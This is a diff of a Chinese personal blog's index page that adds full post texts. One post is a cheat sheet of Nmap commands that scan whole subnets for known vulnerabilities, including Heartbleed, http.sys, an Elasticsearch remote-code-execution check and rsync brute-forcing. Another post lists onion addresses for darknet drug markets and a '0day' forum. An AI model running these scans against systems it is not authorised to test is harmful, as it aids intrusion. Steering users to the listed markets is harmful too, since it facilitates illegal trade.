@@ -1,2337 +1,1116 @@
 <!DOCTYPE html>
+<html lang="en">
 
-
-
-  
-
-
-<html class="theme-next gemini use-motion" lang="zh-CN">
+<!-- Head tag -->
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
 
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 
+    <!--Description-->
+    
+        <meta name="description" content="只为做笔记">
+    
 
+    <!--Author-->
+    
+        <meta name="author" content="lfoder">
+    
 
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="默小文"/>
+    
 
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="只为做笔记" />
+    
 
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="默小文"/>
 
+    <!--Type page-->
+    
+        <meta property="og:type" content="website" />
+    
 
+    <!--Page Cover-->
+    
 
+    <meta name="twitter:card" content="summary" />
+    
 
+    <!-- Title -->
+    
+    <title>默小文</title>
 
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
 
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
 
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
 
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="css/style.css">
 
+    <!-- Google Analytics -->
+    
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link href="../lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="../css/main.css?v=6.0.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="../images/apple-touch-icon-next.png?v=6.0.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="../images/favicon-32x32-next.png?v=6.0.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="../images/favicon-16x16-next.png?v=6.0.4">
-
-
-  <link rel="mask-icon" href="../images/logo.svg?v=6.0.4" color="#222">
-
-
-
-
-
-
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Gemini',
-    version: '6.0.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
-
-  
-  <meta name="keywords" content="Hexo, NexT" />
-
-
-<meta name="description" content="只为做笔记">
-<meta property="og:type" content="website">
-<meta property="og:title" content="默小文">
-<meta property="og:url" content="https://lfoder.github.io/index.html">
-<meta property="og:site_name" content="默小文">
-<meta property="og:description" content="只为做笔记">
-<meta property="og:locale" content="zh-CN">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="默小文">
-<meta name="twitter:description" content="只为做笔记">
-
-
-
-  <link rel="alternate" href="atom.xml" title="默小文" type="application/atom+xml" />
-
-
-
-
-  <link rel="canonical" href="https://lfoder.github.io/"/>
-
-
-
-<script type="text/javascript" id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-  <title>默小文</title>
-  
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style type="text/css">
-    .use-motion .motion-element,
-    .use-motion .brand,
-    .use-motion .menu-item,
-    .sidebar-inner,
-    .use-motion .post-block,
-    .use-motion .pagination,
-    .use-motion .comments,
-    .use-motion .post-header,
-    .use-motion .post-body,
-    .use-motion .collection-title { opacity: initial; }
-
-    .use-motion .logo,
-    .use-motion .site-title,
-    .use-motion .site-subtitle {
-      opacity: initial;
-      top: initial;
-    }
-
-    .use-motion {
-      .logo-line-before i { left: initial; }
-      .logo-line-after i { right: initial; }
-    }
-  </style>
-</noscript>
 
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
 
-  
-  
-    
-  
+<body>
 
-  <div class="container sidebar-position-left 
-  page-home">
-    <div class="headband"></div>
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"> <div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">默小文</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <h1 class="site-subtitle" itemprop="description">当你在眺望深渊时，深渊也在眺望你</h1>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="" rel="section">
-            <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="" rel="section">
-            <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="" rel="section">
-            <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="" rel="section">
-            <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-sitemap">
-          <a href="sitemap.xml" rel="section">
-            <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />站点地图</a>
-        </li>
-      
-
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
-        </li>
-      
-    </ul>
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+            <li class="menu-item">
+                <a href="index.html">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+        </ul>
     </div>
-  </div>
-  <div id="local-search-result"></div>
 </div>
 
-
-
-    </div>
-  
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
 </nav>
 
+<div class="container">
 
-  
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
 
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+            <h1 id="main-title" class="title">默小文</h1>
+        
+    </div>
+</header>
 
-
- </div>
-    </header>
-
-    
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
+        <section class="main">
             
-  <section id="posts" class="posts-expand">
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://lfoder.github.io2018/04/12/Nmap扫描与发现漏洞全技巧/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lfoder">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="默小文">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="2018/04/12/Nmap扫描与发现漏洞全技巧/" itemprop="url">Nmap扫描与发现漏洞全技巧</a></h2>
-        
+<div class="post">
 
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-12T15:13:51+08:00">2018-04-12</time>
-            
-
-            
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="categories/Nmap教程/" itemprop="url" rel="index"><span itemprop="name">Nmap教程</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          收集 Nmap 扫描与发现漏洞的各种脚本与实践
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="2018/04/12/Nmap扫描与发现漏洞全技巧/">
-              阅读全文 &raquo;
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="2018/04/12/Nmap扫描与发现漏洞全技巧/">
+                Nmap扫描与发现漏洞全技巧
             </a>
-          </div>
-          <!--/noindex-->
-        
-      
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-04-12</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/Nmap教程/">Nmap教程</a>
+                </span>
+            
+        </div>
     </div>
 
     
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://lfoder.github.io2018/04/11/DarkNet/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lfoder">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="默小文">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="2018/04/11/DarkNet/" itemprop="url">暗网导航</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-11T00:19:55+08:00">2018-04-11</time>
-            
-
-            
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+        <div class="content">
+            <h3 id="漏洞主机发现"><a href="#漏洞主机发现" class="headerlink" title="漏洞主机发现"></a>漏洞主机发现</h3><h4 id="验证iis短文件名泄露"><a href="#验证iis短文件名泄露" class="headerlink" title="验证iis短文件名泄露"></a>验证iis短文件名泄露</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 --script http-iis-short-name-brute 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+<h4 id="验证Memcached未授权访问漏洞"><a href="#验证Memcached未授权访问漏洞" class="headerlink" title="验证Memcached未授权访问漏洞"></a>验证Memcached未授权访问漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 11211 -script memcached-info 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+<p>####验证http.sys远程代码执行漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV  -script http-vuln-cve2015-1635 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+<p>####验证心脏出血漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script=ssl-heartbleed 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+<h4 id="验证Mongodb未授权访问漏洞"><a href="#验证Mongodb未授权访问漏洞" class="headerlink" title="验证Mongodb未授权访问漏洞"></a>验证Mongodb未授权访问漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 27017 --script mongodb-info 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+<p>####验证Redis未授权访问漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 6379 --script redis-info 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+<p>####验证Elasticsearch未授权访问漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=http-vuln-cve2015-1427 --script-args command=&apos;ls&apos; 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+<p>####验证Rsync未授权访问漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 873 --script rsync-brute --script-args &apos;rsync-brute.module=www&apos; 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>相关资料：</p>
+<p><a href="https://blog.csdn.net/jiangliuzheng/article/details/51992220" target="_blank" rel="noopener">https://blog.csdn.net/jiangliuzheng/article/details/51992220</a></p>
+<p><a href="https://blog.csdn.net/hackerie/article/details/78065636" target="_blank" rel="noopener">https://blog.csdn.net/hackerie/article/details/78065636</a></p>
+<p><a href="http://www.vuln.cn/2444" target="_blank" rel="noopener">http://www.vuln.cn/2444</a></p>
+</blockquote>
 
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
-
-      
-        
-          通过Tor爬虫和深度学习来记录并分析暗网活跃的站点列表，暂不公布技术细节
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="2018/04/11/DarkNet/">
-              阅读全文 &raquo;
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="2018/04/11/DarkNet/">
+                暗网导航
             </a>
-          </div>
-          <!--/noindex-->
-        
-      
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-04-11</span>
+            
+            
+            
+        </div>
     </div>
 
     
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://lfoder.github.io2018/03/12/Mounty挂载失败解决方法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lfoder">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="默小文">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="2018/03/12/Mounty挂载失败解决方法/" itemprop="url">Mounty挂载失败解决方法</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-12T11:00:11+08:00">2018-03-12</time>
-            
-
-            
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+        <div class="content">
+            <h2 id="DarkNet-Nav"><a href="#DarkNet-Nav" class="headerlink" title="DarkNet Nav"></a>DarkNet Nav</h2><h3 id="Search-Engine"><a href="#Search-Engine" class="headerlink" title="Search Engine"></a>Search Engine</h3><table>
+<thead>
+<tr>
+<th style="text-align:center">Site</th>
+<th style="text-align:center">Domain</th>
+<th style="text-align:center">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">The Pirate Bay</td>
+<td style="text-align:center">uj3wazyk5u4hnvtk.onion</td>
+<td style="text-align:center">BT Search</td>
+</tr>
+<tr>
+<td style="text-align:center">not Evil</td>
+<td style="text-align:center">hss3uro2hsxfogfq.onion</td>
+<td style="text-align:center">DarkNet Search Engine</td>
+</tr>
+<tr>
+<td style="text-align:center">The Hidden Wiki</td>
+<td style="text-align:center">zqktlwi4fecvo6ri.onion</td>
+<td style="text-align:center">DarkNet  Navigation</td>
+</tr>
+<tr>
+<td style="text-align:center">DuckDuckGO</td>
+<td style="text-align:center">3g2upl4pq6kufc4m.onion</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">Tor Search Engine</td>
+<td style="text-align:center">xmh57jrzrnw6insl.onion</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Market"><a href="#Market" class="headerlink" title="Market"></a>Market</h3><table>
+<thead>
+<tr>
+<th style="text-align:center">Site</th>
+<th style="text-align:center">Domain</th>
+<th style="text-align:center">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">UnderMarket</td>
+<td style="text-align:center">un62d2ywi33bho53.onion</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">DreamMarket</td>
+<td style="text-align:center">4buzlb3uhrjby2sb.onion</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">Silk Road</td>
+<td style="text-align:center">silkroad7rn2puhj.onion</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">WallstMarket</td>
+<td style="text-align:center">wallstyizjhkrvmj.onion</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">$$$</td>
+<td style="text-align:center">2jv5r7k66ralyk3g.onion</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">BlockChain</td>
+<td style="text-align:center">blockchainbdgpzk.onion</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">EmpireMarket</td>
+<td style="text-align:center">hsqluhqe6dlfl7jaxulf7cfun6xt274btvnqvaorliem5j6sqjiwhdyd.onion</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Forum"><a href="#Forum" class="headerlink" title="Forum"></a>Forum</h3><table>
+<thead>
+<tr>
+<th style="text-align:center">Site</th>
+<th style="text-align:center">Domain</th>
+<th style="text-align:center">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0day</td>
+<td style="text-align:center">qzbkwswfv5k2oj5d.onion</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">Silk Road Forum</td>
+<td style="text-align:center">satri4bb5r56y253.onion</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Community"><a href="#Community" class="headerlink" title="Community"></a>Community</h3><table>
+<thead>
+<tr>
+<th style="text-align:center">Site</th>
+<th style="text-align:center">Domain</th>
+<th style="text-align:center">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">facebook</td>
+<td style="text-align:center"><a href="http://www.facebookcorewwwi.onion" target="_blank" rel="noopener">www.facebookcorewwwi.onion</a></td>
+</tr>
+</tbody>
+</table>
 
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
-
-      
-        
-          Mounty挂载失败的时候，一些解决方案
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="2018/03/12/Mounty挂载失败解决方法/">
-              阅读全文 &raquo;
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="2018/03/12/Mounty挂载失败解决方法/">
+                Mounty挂载失败解决方法
             </a>
-          </div>
-          <!--/noindex-->
-        
-      
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-03-12</span>
+            
+            
+            
+        </div>
     </div>
 
     
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://lfoder.github.io2018/03/09/MacOS安装PostgreSQL/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lfoder">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="默小文">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="2018/03/09/MacOS安装PostgreSQL/" itemprop="url">MacOS安装PostgreSQL</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-09T12:31:29+08:00">2018-03-09</time>
-            
-
-            
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+        <div class="content">
+            <p><strong>错误过程</strong>：</p>
+<p>开机启动 <code>Mounty</code> 挂载NTFS磁盘时出现挂载失败的情况，磁盘在win下面没有安全删除就拔出来了，导致文件系统中有错误区块，所以在MAC中不能挂载成读写模式。</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fp9ungtfepj30ng08et8x.jpg" alt=""></p>
+<p>卷”BOOTCAMP “不可重新挂载</p>
+<p><strong>解决方案</strong>：</p>
+<p>到 win 下 对不可挂载的NTFS磁盘，进行 <code>chkdsk /f</code> 操作 ，并在结束后安全移除磁盘</p>
 
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
-
-      
-        
-          在MacOS上安装 PostgreSQL 并正常配置使用。
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="2018/03/09/MacOS安装PostgreSQL/">
-              阅读全文 &raquo;
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="2018/03/09/MacOS安装PostgreSQL/">
+                MacOS安装PostgreSQL
             </a>
-          </div>
-          <!--/noindex-->
-        
-      
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-03-09</span>
+            
+            
+            
+        </div>
     </div>
 
     
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://lfoder.github.io2018/03/02/天翼光猫破解超级管理员账号密码/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lfoder">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="默小文">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="2018/03/02/天翼光猫破解超级管理员账号密码/" itemprop="url">天翼光猫破解超级管理员账号密码</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-02T23:34:19+08:00">2018-03-02</time>
-            
-
-            
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+        <div class="content">
+            <h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><ul>
+<li>macOS Sierra <code>10.12.6</code></li>
+</ul>
+<h3 id="安装-PostgreSQL"><a href="#安装-PostgreSQL" class="headerlink" title="安装 PostgreSQL"></a>安装 PostgreSQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install postgresql</span><br></pre></td></tr></table></figure>
+<h3 id="配置-PostgreSQL"><a href="#配置-PostgreSQL" class="headerlink" title="配置 PostgreSQL"></a>配置 PostgreSQL</h3><h4 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ pg_ctl -V</span><br><span class="line">pg_ctl (PostgreSQL) 10.3</span><br></pre></td></tr></table></figure>
+<p>安装成功之后，安装路径为：<code>/usr/local/var/postgres</code></p>
+<h4 id="初始化数据库"><a href="#初始化数据库" class="headerlink" title="初始化数据库"></a>初始化数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initdb /usr/local/var/postgres</span><br></pre></td></tr></table></figure>
+<h4 id="手动启动-PostgreSQL"><a href="#手动启动-PostgreSQL" class="headerlink" title="手动启动 PostgreSQL"></a>手动启动 PostgreSQL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log start</span><br></pre></td></tr></table></figure>
+<h4 id="查看-PostgreSQL-运行状态"><a href="#查看-PostgreSQL-运行状态" class="headerlink" title="查看 PostgreSQL 运行状态"></a>查看 PostgreSQL 运行状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log status</span><br></pre></td></tr></table></figure>
+<h4 id="手动停止-PostgreSQL"><a href="#手动停止-PostgreSQL" class="headerlink" title="手动停止 PostgreSQL"></a>手动停止 PostgreSQL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log stop -s -m fast</span><br></pre></td></tr></table></figure>
+<h4 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep postgres</span><br></pre></td></tr></table></figure>
